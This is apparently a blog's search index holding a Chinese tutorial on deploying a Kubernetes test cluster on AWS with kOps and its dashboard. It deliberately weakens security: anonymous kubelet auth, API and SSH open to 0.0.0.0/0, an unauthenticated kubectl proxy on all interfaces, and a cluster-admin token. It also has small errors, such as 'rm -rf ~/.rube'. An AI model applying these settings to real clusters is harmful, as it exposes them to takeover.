<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>利用 kOps 在 AWS 部署 k8s 集群</title>
      <link href="/container/li-yong-kops-zai-aws-bu-shu-k8s-ji-qun/"/>
      <url>/container/li-yong-kops-zai-aws-bu-shu-k8s-ji-qun/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p>不要照抄命令，示例版本过久，会导致 k8s 各种版本兼容问题</p></blockquote><p>安装 k8s：</p><ul><li>《<a href="https://aws.amazon.com/cn/blogs/china/how-to-build-kubernetes-based-on-ec2-in-aws-china/">如何在 AWS 中国区上基于 EC 2搭建 Kubernetes</a>》</li><li>《<a href="https://www.jianshu.com/p/7d448abae039">AWS EC2 上安装 Kubernetes 的示例</a>》</li><li>《<a href="https://medium.com/@sanjay.chauhan164/https-medium-com-sanjay-chauhan164-kubernetes-with-kops-on-aws-20debcf3e1db">Kubernetes with KOPS on AWS - Clusters, Metrics Server, Dashboard (Web UI), Scaling HPA, Disruption Budget</a>》</li></ul><h2 id="Github-资源"><a href="#Github-资源" class="headerlink" title="Github 资源"></a>Github 资源</h2><ul><li><a href="https://github.com/kubernetes/kops">kops</a>： oob 工具，装好集群之后，若要再安装 Metrics Server 、 kubernetes-dashboard 之类的插件，直接通过其 <a href="https://github.com/kubernetes/kops/tree/master/addons">addons</a> 目录指引安装，避免出现版本兼容性问题</li><li><a href="https://github.com/kubernetes/kubernetes">kubernetes</a></li><li><a href="https://github.com/kubernetes/dashboard">dashboard</a></li><li><a href="https://github.com/kubernetes-sigs/metrics-server">metrics-server</a></li></ul><hr><h2 id="准备工作：部署-kOps-控制服务器"><a href="#准备工作：部署-kOps-控制服务器" class="headerlink" title="准备工作：部署 kOps 控制服务器"></a>准备工作：部署 kOps 控制服务器</h2><p>其作用就是以 oob 方式管理 k8s 集群，这台服务器具备 aws 账号权限，可以使用创建或删除用于部署 k8s 的 ec2 实例、vpc、安全组、s3 存储桶等。</p><p>因为它不属于集群的一部分，但是可以使用 kubectl 工具以客户端的方式直接管理 k8s 集群（的master节点和工作节点），因此在 aws 申请一台低配的机器即可。例如 2c4g 的 ubuntu 18。</p><p>下面所有操作均在这台服务器上执行，无需登陆 k8s 集群的任何节点。</p><h3 id="安装-kubectl"><a href="#安装-kubectl" class="headerlink" title="安装 kubectl"></a>安装 kubectl</h3><p>集群中的 kube-apiserver 为服务端（由 kOps 负责安装），所以此处相当于安装客户端。</p><p>安装：</p><pre class="line-numbers language-shell"><code class="language-shell">curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"chmod +x kubectlmv kubectl /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>要下载特定版本，将命令中的 <code>$(curl -L -s https://dl.k8s.io/release/stable.txt)</code> 部分替换为指定版本即可，而且一定要去看下最新的稳定版是哪个，k8s 对版本兼容性是有严格要求的，一旦不匹配集群会跑不起来（例如 metrics-server 装错版本集群就会崩掉）</p></blockquote><ul><li>《<a href="https://kubernetes.io/zh/docs/tasks/tools/install-kubectl/">安装并配置 kubectl</a>》</li><li>《<a href="https://kubernetes.io/zh/docs/setup/release/version-skew-policy/">Kubernetes 版本及版本偏差支持策略</a>》</li></ul><p>验证：<code>kubectl version --short --client</code></p><blockquote><p>使用 <code>kubectl version</code> 可同时查看客户端和服务端版本，但现在服务端还没安装，查询会超时，故先查客户端。</p></blockquote><h3 id="安装-kOps"><a href="#安装-kOps" class="headerlink" title="安装 kOps"></a>安装 kOps</h3><p>安装：</p><pre class="line-numbers language-shell"><code class="language-shell">curl -Lo kops https://github.com/kubernetes/kops/releases/download/$(curl -s https://api.github.com/repos/kubernetes/kops/releases/latest | grep tag_name | cut -d '"' -f 4)/kops-linux-amd64chmod +x kopsmv kops /usr/local/bin/kops<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>要下载特定版本，将命令中的 <code>$(curl -s https://api.github.com/repos/kubernetes/kops/releases/latest | grep tag_name | cut -d '"' -f 4)</code> 部分替换为指定版本即可，而且一定要去看下最新的稳定版是哪个，建议根据《<a href="https://kops.sigs.k8s.io/welcome/releases/">kOps版本和版本控制</a>》 看一下哪个 kOps 版本支持安装的 k8s 集群版本与前面安装的 kubectl 版本一致（若没有则用 kubectl 对齐 k8s 的版本，反正两者一定要满足《<a href="https://kubernetes.io/zh/docs/setup/release/version-skew-policy/">Kubernetes 版本及版本偏差支持策略</a>》）</p></blockquote><p>验证： <code>kops version</code></p><h3 id="安装-awscli"><a href="#安装-awscli" class="headerlink" title="安装 awscli"></a>安装 awscli</h3><p>用于创建或删除用于部署 k8s 的 ec2 实例、vpc、安全组、s3 存储桶等</p><p>安装：</p><pre class="line-numbers language-shell"><code class="language-shell">apt-get updateapt-get install awscli<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>验证： <code>aws</code></p><p>为了通过命令行执行 aws 控制台的部分功能，需要为其配置你个人 aws 账号的 AccessKeyID 和 SecretAccessKey 进行授权。</p><p>打开 <a href="https://console.aws.amazon.com/iam/">AWS IAM 控制面板</a>，点击左侧导航栏的【用户】便可找到你自己的个人账号，点击该账号，点击【安全证书】标签，点击【创建访问密钥】，即可得到 AccessKeyID 和 SecretAccessKey。</p><blockquote><p>这个密钥只是临时用的，下面配置好 kops 用户后记得回来删除掉。</p></blockquote><p>配置： <code>aws configure</code><br>会提问 4 个问题：</p><ul><li>AWS Access Key ID: 输入上面生成的 AccessKeyID</li><li>AWS Secret Access Key: 输入上面生成的 SecretAccessKey</li><li>Default region name: 输入你期望之后 kOps 创建 ec2 实例时应该创建在哪个地区，例如 us-east-1</li><li>Default output format: aws 执行结果回显到命令行界面的格式， 默认 text， 建议 json</li></ul><blockquote><p>注意 AWS 关于 <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Concepts.RegionsAndAvailabilityZones.html">Regions, Availability Zones, and Local Zones</a> 的区别，此处填的是地区 Regions，例如 us-east-1。 后面会要求细化粒度到可用地区 Zones，例如 us-east-1a、us-east-1b、us-east-1c 等</p></blockquote><h3 id="创建名为-kops-的-IAM-用户"><a href="#创建名为-kops-的-IAM-用户" class="headerlink" title="创建名为 kops 的 IAM 用户"></a>创建名为 kops 的 IAM 用户</h3><p>为了使用 kops 部署集群，还需要为 kops 创建一个 IAM 用户 kops，并分配相应的权限。包括：</p><ul><li>AmazonEC2FullAccess</li><li>AmazonRoute53FullAccess</li><li>AmazonS3FullAccess</li><li>IAMFullAccess</li><li>AmazonVPCFullAccess</li></ul><p>由于前面 awscli 已经拥有了你的 aws 账号权限，因此可以直接用命令方式创建 kops 用户并为其分配权限：</p><pre class="line-numbers language-shell"><code class="language-shell">aws iam create-group --group-name kopsaws iam attach-group-policy --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess --group-name kopsaws iam attach-group-policy --policy-arn arn:aws:iam::aws:policy/AmazonRoute53FullAccess --group-name kopsaws iam attach-group-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --group-name kopsaws iam attach-group-policy --policy-arn arn:aws:iam::aws:policy/IAMFullAccess --group-name kopsaws iam attach-group-policy --policy-arn arn:aws:iam::aws:policy/AmazonVPCFullAccess --group-name kopsaws iam create-user --user-name kopsaws iam add-user-to-group --user-name kops --group-name kops<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为 kops 用户创建密钥：</p><p><code>aws iam create-access-key --user-name kops</code></p><blockquote><p>创建后，可以在 AWS 的 IAM 控制台 UI 上看到用户 kops。</p></blockquote><p>此命令会返回 kops 用户的 AccessKeyID 和 SecretAccessKey，现在更新一下 aws 配置：<code>aws configure</code></p><p>同样会提问 4 个问题：</p><ul><li>AWS Access Key ID: 输入上面生成的 kops 用户的 AccessKeyID</li><li>AWS Secret Access Key: 输入上面生成的 kops 用户的 SecretAccessKey</li><li>Default region name: 保持不变即可</li><li>Default output format: 保持不变即可</li></ul><p>同时把 kops 用户的配置信息写入到 <code>~/.bashrc</code> 环境变量：</p><pre class="line-numbers language-shell"><code class="language-shell">echo 'export AWS_ACCESS_KEY_ID=...' >> ~/.bashrcecho 'export AWS_SECRET_ACCESS_KEY=...' >> ~/.bashrcecho 'export AWS_REGION=us-east-1' >> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后生成 ssh 密钥：<code>ssh-keygen</code> （会有几个问题，回车到底即可）</p><blockquote><p>生成的密钥位置为 <code>~/.ssh/</code>，此密钥可用于之后登陆 k8s 集群。</p></blockquote><h3 id="创建-s3-Bucket"><a href="#创建-s3-Bucket" class="headerlink" title="创建 s3 Bucket"></a>创建 s3 Bucket</h3><p>存储桶用于存储集群数据，其命名格式要求为: <code>&lt;custom_name&gt;.k8s.local-state</code></p><p>例如： <code>test.k8s.local-state</code> （注意后缀一个字符都不能改，下文的存储桶名称均以此为示例）</p><p>存储桶名称要求全球唯一，如果创建失败了，注意看提示是否名称已经被占用了。</p><p>创建命令：</p><pre class="line-numbers language-shell"><code class="language-shell">aws s3 mb s3://test.k8s.local-state --region us-east-1 --endpoint-url https://s3.us-east-1.amazonaws.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令中的 <code>--region</code> 和 <code>--endpoint-url</code> 参数均涉及地区名称，和前面配置 aws 时的 region 名称保持一致即可</p></blockquote><p>创建成功后，访问 aws <a href="https://s3.console.aws.amazon.com/s3">s3</a> 可以看到该存储桶。</p><p>最后把 s3 的配置信息写入到 <code>~/.bashrc</code> 环境变量：</p><pre class="line-numbers language-shell"><code class="language-shell">echo 'export KOPS_STATE_STORE=s3://test.k8s.local-state' >> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建-k8s-集群"><a href="#创建-k8s-集群" class="headerlink" title="创建 k8s 集群"></a>创建 k8s 集群</h2><p>前面准备工作完成后，即可使用 kOps 创建集群。</p><p>生成集群的配置文件：</p><pre class="line-numbers language-shell"><code class="language-shell">kops create cluster \     --name=test.k8s.local \     --zones=us-east-1c \     --master-size="t2.medium" \     --node-size="t2.medium" \     --ssh-public-key="~/.ssh/id_rsa.pub"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>--name</code> 就是集群名称，固定格式为 <code>&lt;custom_name&gt;.k8s.local</code>， 为了让 kops 创建基于 gossip 的集群，集群的命名需要使用 <code>.k8s.local</code> 作为后缀，同时它可以自动关联到前面的 s3 Bucket 名称 <code>test.k8s.local-state</code> </li><li><code>--zones</code> 配置的是【可用地区】，注意 AWS 关于 <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Concepts.RegionsAndAvailabilityZones.html">Regions, Availability Zones, and Local Zones</a> 的区别，前面配置的是地区 Regions，例如 us-east-1。 现在这里配置的是可用地区 Zones，例如 us-east-1a、us-east-1b、us-east-1c 等</li><li><code>--master-size</code> 和 <code>--node-size</code> 指定的都是 ec2 的实例类型，决定实例的硬件配置，是 2c4g 还是 4c8g 等，kOps 创建 k8s 集群时会新建若干个 ec2 实例作为 node 节点，故而需要这个参数。具体的 ec2 类型可参考<a href="https://aws.amazon.com/cn/ec2/pricing/on-demand/">这里</a></li><li><code>--ssh-public-key</code> 就是把当前 kOps 服务器的 ssh 公钥写入 k8s 集群的每一个 node 节点，以便之后可以直接通过 ssh 登陆</li></ul><p>create 命令执行成功后, 会提示执行 <code>kops update cluster --name test.k8s.local --yes --admin</code> 命令正式创建集群，但这里先不创建。</p><p>我们需要调整集群的配置文件：<code>kops edit cluster test.k8s.local</code></p><p>v1.19.7 版本生成的集群配置文件如下，这里主要修改两处：</p><ul><li>修改 <code>kubelet.anonymousAuth: true</code>: 因为搭建的是测试用的集群，避免认证麻烦，这里把匿名打开</li><li>追加 <code>metricsServer.enabled: true</code>: <a href="https://github.com/kubernetes-sigs/metrics-server">metrics-server</a> 主要用于收集 cpu 内存等信息给 kubernetes-dashboard，但是官方不再推荐安装这个插件，主要是该插件与 kube-apiserver 有版本冲突（见《<a href="https://www.bookstack.cn/read/kubernetes-practice-guide/troubleshooting-cases-schemaerror-when-using-kubectl-apply-or-edit.md">kubectl edit 或者 apply 报 SchemaError</a>》），故而直接将其内置，并推荐使用开关方式激活这个插件，详见  <a href="https://github.com/kubernetes/kops/blob/master/addons/metrics-server/README.md">kops/addons/metrics-server</a></li></ul><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Please edit the object below. Lines beginning with a '#' will be ignored,</span><span class="token comment" spellcheck="true"># and an empty file will abort the edit. If an error occurs while saving this file will be</span><span class="token comment" spellcheck="true"># reopened with the relevant failures.</span><span class="token comment" spellcheck="true">#</span><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> kops.k8s.io/v1alpha2<span class="token key atrule">kind</span><span class="token punctuation">:</span> Cluster<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">creationTimestamp</span><span class="token punctuation">:</span> <span class="token string">"2021-02-08T03:28:29Z"</span>  <span class="token key atrule">generation</span><span class="token punctuation">:</span> <span class="token number">1</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> hids.k8s.local<span class="token key atrule">spec</span><span class="token punctuation">:</span>  <span class="token key atrule">api</span><span class="token punctuation">:</span>    <span class="token key atrule">loadBalancer</span><span class="token punctuation">:</span>      <span class="token key atrule">class</span><span class="token punctuation">:</span> Classic      <span class="token key atrule">type</span><span class="token punctuation">:</span> Public  <span class="token key atrule">authorization</span><span class="token punctuation">:</span>    <span class="token key atrule">rbac</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token key atrule">channel</span><span class="token punctuation">:</span> stable  <span class="token key atrule">cloudProvider</span><span class="token punctuation">:</span> aws  <span class="token key atrule">configBase</span><span class="token punctuation">:</span> s3<span class="token punctuation">:</span>//hids.k8s.local<span class="token punctuation">-</span>state/hids.k8s.local  <span class="token key atrule">containerRuntime</span><span class="token punctuation">:</span> docker  <span class="token key atrule">etcdClusters</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">cpuRequest</span><span class="token punctuation">:</span> 200m    <span class="token key atrule">etcdMembers</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">instanceGroup</span><span class="token punctuation">:</span> master<span class="token punctuation">-</span>us<span class="token punctuation">-</span>east<span class="token punctuation">-</span>1c      <span class="token key atrule">name</span><span class="token punctuation">:</span> c    <span class="token key atrule">memoryRequest</span><span class="token punctuation">:</span> 100Mi    <span class="token key atrule">name</span><span class="token punctuation">:</span> main  <span class="token punctuation">-</span> <span class="token key atrule">cpuRequest</span><span class="token punctuation">:</span> 100m    <span class="token key atrule">etcdMembers</span><span class="token punctuation">:</span>    <span class="token punctuation">-</span> <span class="token key atrule">instanceGroup</span><span class="token punctuation">:</span> master<span class="token punctuation">-</span>us<span class="token punctuation">-</span>east<span class="token punctuation">-</span>1c      <span class="token key atrule">name</span><span class="token punctuation">:</span> c    <span class="token key atrule">memoryRequest</span><span class="token punctuation">:</span> 100Mi    <span class="token key atrule">name</span><span class="token punctuation">:</span> events  <span class="token key atrule">iam</span><span class="token punctuation">:</span>    <span class="token key atrule">allowContainerRegistry</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">legacy</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">kubelet</span><span class="token punctuation">:</span>    <span class="token key atrule">anonymousAuth</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">kubernetesApiAccess</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> 0.0.0.0/0  <span class="token key atrule">kubernetesVersion</span><span class="token punctuation">:</span> 1.19.7  <span class="token key atrule">masterInternalName</span><span class="token punctuation">:</span> api.internal.hids.k8s.local  <span class="token key atrule">masterPublicName</span><span class="token punctuation">:</span> api.hids.k8s.local  <span class="token key atrule">metricsServer</span><span class="token punctuation">:</span>    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">networkCIDR</span><span class="token punctuation">:</span> 172.20.0.0/16  <span class="token key atrule">networking</span><span class="token punctuation">:</span>    <span class="token key atrule">kubenet</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token key atrule">nonMasqueradeCIDR</span><span class="token punctuation">:</span> 100.64.0.0/10  <span class="token key atrule">sshAccess</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> 0.0.0.0/0  <span class="token key atrule">subnets</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> <span class="token key atrule">cidr</span><span class="token punctuation">:</span> 172.20.32.0/19    <span class="token key atrule">name</span><span class="token punctuation">:</span> us<span class="token punctuation">-</span>east<span class="token punctuation">-</span>1c    <span class="token key atrule">type</span><span class="token punctuation">:</span> Public    <span class="token key atrule">zone</span><span class="token punctuation">:</span> us<span class="token punctuation">-</span>east<span class="token punctuation">-</span>1c  <span class="token key atrule">topology</span><span class="token punctuation">:</span>    <span class="token key atrule">dns</span><span class="token punctuation">:</span>      <span class="token key atrule">type</span><span class="token punctuation">:</span> Public    <span class="token key atrule">masters</span><span class="token punctuation">:</span> public    <span class="token key atrule">nodes</span><span class="token punctuation">:</span> public<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置文件默认以 vim 模式编辑，只要格式符合 yaml ，并且配置项都是当前 k8s 版本支持的，就可以成功保存修改内容（否则会提示保存失败）。</p><p>保存后执行 <code>kops update cluster --name test.k8s.local --yes --admin</code> 命令即可真正创建 k8s 集群。</p><p>大概需要 10 分钟，此时切换到 aws 的 <a href="https://console.aws.amazon.com/ec2">ec2</a> 控制台查看【实例】，可以看见 k8s 的实例正在创建中。</p><h2 id="查看集群状态"><a href="#查看集群状态" class="headerlink" title="查看集群状态"></a>查看集群状态</h2><p>较旧的 kOps 版本所创建的集群有 3 个节点： 1 个 master 和 2 个 工作节点。</p><p>较新版本的 kOps 所创建的集群只有 2 个节点： master 和工作节点各一。</p><p>查看集群状态： <code>kops validate cluster</code>： </p><h2 id="操作集群"><a href="#操作集群" class="headerlink" title="操作集群"></a>操作集群</h2><p>只要集群正常启动了，以后就可以在 kOps 的服务器以 oob 方式通过 kubectl 直接操作集群了，无需登陆到集群的任何节点。</p><ul><li><code>kubectl get nodes</code>： 查看集群节点</li><li><code>kubectl cluster-info</code>： 查看集群信息，主要查询对公访问域名（其实是 LB 提供的域名，可以在 aws 控制台的负载均衡器找到它）</li><li><code>kubectl version</code>： 查看集群版本</li><li><code>kubectl config view</code>： 查看集群配置，其实就是查看 <code>~/.kube/config</code> 文件</li><li><code>kubectl get deployments --all-namespaces</code>： 查看所有名字空间的 Deployment</li><li><code>kubectl get rs --all-namespaces</code>： 查看所有名字空间的 Deployment</li><li><code>kubectl get deployments --all-namespaces</code>： 查看所有名字空间的 ReplicaSet</li><li><code>kubectl get pods --all-namespaces</code>： 查看所有名字空间的 pod</li><li><code>kubectl get svc --all-namespaces</code>： 查看所有名字空间的 service</li></ul><h2 id="获取-kube-和-admin-账号的密码"><a href="#获取-kube-和-admin-账号的密码" class="headerlink" title="获取 kube 和 admin 账号的密码"></a>获取 kube 和 admin 账号的密码</h2><p>默认情况下集群有两个账号 admin 和 kube，可以通过 kOps 获取其密码：</p><pre class="line-numbers language-shell"><code class="language-shell">kops get secrets kube --type secret -oplaintextkops get secrets admin --type secret -oplaintext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>旧版本的 kOps 有 BUG，获取到的密码是反的，就是说 kube 返回的是 admin 的密码， admin 返回的是 kube 的密码</p></blockquote><p>不过这两个密码暂时用不到，可以先无视。</p><h2 id="登陆到集群"><a href="#登陆到集群" class="headerlink" title="登陆到集群"></a>登陆到集群</h2><p>因为前面创建集群的时候已经配置了 ssh 密钥了，所以可以直接从 kOps 登陆到集群的任意节点。</p><p>从 ec2 控制台查看集群节点的 公网ip 后，直接 ssh 登陆即可。</p><p>旧版本的 kOps 所创建集群节点，其 ssh 的登陆账号默认都是 admin，但是新版本会以集群节点的操作系统名称作为 ssh 的登陆账号，例如 ubuntu、centos 等。 使用的操作系统一般与 kOps 服务器一致，也可在 ec2 控制台直接查看实例的操作系统版本。</p><h2 id="部署-dashboard"><a href="#部署-dashboard" class="headerlink" title="部署 dashboard"></a>部署 dashboard</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>为了方便从 ui 管理 k8s ，可以安装 <a href="https://github.com/kubernetes/dashboard">kubernetes-dashboard</a>：</p><p>因为我们是通过 kOps 安装的集群，为了避免版本兼容性问题，可以直接根据 <a href="https://github.com/kubernetes/kops/blob/master/addons/kubernetes-dashboard/addon.yaml">kops/addons/kubernetes-dashboard/addon.yaml</a> 查看匹配的版本，然后获取其 yaml 脚本进行安装。</p><p>例如当前安装的为 v1.19.7 版本的 k8s 集群，则应使用 2.0.1 版本的 dashboard， 故而安装命令为：</p><pre class="line-numbers language-shell"><code class="language-shell">kubectl apply -f https://raw.githubusercontent.com/kubernetes/kops/master/addons/kubernetes-dashboard/v2.0.1.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 <code>kubectl get pods --all-namespaces</code> 命令可查看是否安装成功： 名为 <code>kubernetes-dashboard-xxxxx</code> 的 pod 其 READY=1/1， STATUS=Running</p><blockquote><p>《<a href="https://docs.aws.amazon.com/zh_cn/eks/latest/userguide/dashboard-tutorial.html">教程：部署 Kubernetes 控制面板 （Web UI）</a>》</p></blockquote><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>根据 <a href="https://github.com/kubernetes/dashboard">kubernetes-dashboard</a> 的官方说明，我们只需访问这个地址即可访问 dashboard：</p><p><code>https://&lt;master-ip&gt;:&lt;apiserver-port&gt;/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/</code></p><p>其中 <code>&lt;master-ip&gt;</code> 为 <code>kubectl cluster-info</code> 命令查询到 Kubernetes master 域名，<br><code>&lt;apiserver-port&gt;</code> 为 443</p><p>但是事实上无法访问，会一直报错 401 Unauthorized</p><p>原因是在 1.16 版本之后，kube-apiserver 必须要认证后方可访问，但是我们部署集群时，因为是测试环境，所以没有配置证书、甚至 BasicAuth 也没有配置，所以从公网是无法访问的。</p><hr><p>那么测试环境有没有简单的方式呢？</p><p>是有的。 我们在 kOps 的服务器上做一个代理转发：</p><p><code>kubectl proxy --address='0.0.0.0' --port='8001' --accept-hosts='^*$'</code></p><p>此时通过 <code>http://&lt;kops-ip&gt;:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/</code> 即可访问 dashboard（注意协议从原本的 https 改为 http）</p><p>但是我们发现无法登陆（按钮变灰），报错为：Insecure access detected. Sign in will not be available. Access Dashboard securely over HTTPS or using localhost.</p><p>详细原因见《<a href="https://github.com/kubernetes/dashboard/blob/master/docs/user/accessing-dashboard/README.md#login-not-available">Accessing Dashboard</a>》，主要是为了安全期间，在 1.16 版本之后， dashboard 如果使用 http 协议，只能从本地登陆（127.0.0.1 或 localhost）; 如果使用 https ，才可以从非本地登陆。</p><hr><p>那有没有办法绕过呢？</p><p>是可以的，参考 《<a href="https://segmentfault.com/a/1190000023130407">访问K8s Dashboard的几种方式</a>》，我们在本地做一个本地端口转发，把流量转发到 kOps 的 8001 端口即可。 （生产环境不建议使用此方式）</p><p>具体方法是：</p><ul><li>kOps 的 sshd 服务除了 22 端口外，增加监听一个端口用于本地端口转发，如 54322 ：  <code>vim /etc/ssh/sshd_config</code> ，取消 Port 22 注释，并添加一行 Port 54322， 重启 sshd 服务</li><li>在 kOps 执行命令  <code>kubectl proxy</code> （默认只代理 127.0.0.1:8001， 不能是 0.0.0.0:8001）</li><li>在本地 pc 执行命令： <code>ssh -L localhost:8001:localhost:8001 -NT ubuntu@&lt;kops-ip&gt; -p 54322</code></li><li>访问 <code>http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/#/login</code> 此时可看到按钮可点击</li></ul><p>但是需要先填入 token 。<br>token 生成方式不难，</p><p>我们先在 kOps 服务上生成一个名为 <code>eks-admin-service-account.yaml</code> 的文件，文件内容为：</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> v1<span class="token key atrule">kind</span><span class="token punctuation">:</span> ServiceAccount<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> eks<span class="token punctuation">-</span>admin  <span class="token key atrule">namespace</span><span class="token punctuation">:</span> kube<span class="token punctuation">-</span>system<span class="token punctuation">---</span><span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> rbac.authorization.k8s.io/v1beta1<span class="token key atrule">kind</span><span class="token punctuation">:</span> ClusterRoleBinding<span class="token key atrule">metadata</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> eks<span class="token punctuation">-</span>admin<span class="token key atrule">roleRef</span><span class="token punctuation">:</span>  <span class="token key atrule">apiGroup</span><span class="token punctuation">:</span> rbac.authorization.k8s.io  <span class="token key atrule">kind</span><span class="token punctuation">:</span> ClusterRole  <span class="token key atrule">name</span><span class="token punctuation">:</span> cluster<span class="token punctuation">-</span>admin<span class="token key atrule">subjects</span><span class="token punctuation">:</span><span class="token punctuation">-</span> <span class="token key atrule">kind</span><span class="token punctuation">:</span> ServiceAccount  <span class="token key atrule">name</span><span class="token punctuation">:</span> eks<span class="token punctuation">-</span>admin  <span class="token key atrule">namespace</span><span class="token punctuation">:</span> kube<span class="token punctuation">-</span>system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该配置文件定义了一个服务账号 eks-admin 和集群角色</p><p>然后执行命令 <code>kubectl apply -f eks-admin-service-account.yaml</code> 将其绑定到 k8s 集群。</p><p>再执行命令 <code>kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep eks-admin | awk '{print $1}')</code> 即可生成用户 eks-admin 的临时 token ， 将其填入登陆界面即可登陆到 dashboard。</p><p>(注意 token 有效期只有半小时，过期后需要重新生成才能登陆)</p><blockquote><p>其他资料《<a href="https://stackoverflow.com/questions/62965122/is-it-possible-to-disable-kubernetes-dashboard-tls-check">Is it possible to disable kubernetes dashboard tls check</a>》</p></blockquote><h2 id="删除-k8s-集群"><a href="#删除-k8s-集群" class="headerlink" title="删除 k8s 集群"></a>删除 k8s 集群</h2><p>删除集群：</p><pre><code>kops delete  cluster test.k8s.local --yes</code></pre><p>删除配置（主要是集群的一些配置信息，包括登陆认证等，为了避免以后重建集群时出现各种原因不明的认证问题，最好是删掉）:</p><pre><code>rm -rf ~/.rube</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 容器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 容器 </tag>
            
            <tag> kubernetes </tag>
            
            <tag> k8s </tag>
            
            <tag> kops </tag>
            
            <tag> aws </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 mstream 搭建私人云音乐库</title>
      <link href="/website/mstream-da-jian-si-ren-yun-yin-le-ku/"/>
      <url>/website/mstream-da-jian-si-ren-yun-yin-le-ku/</url>
      
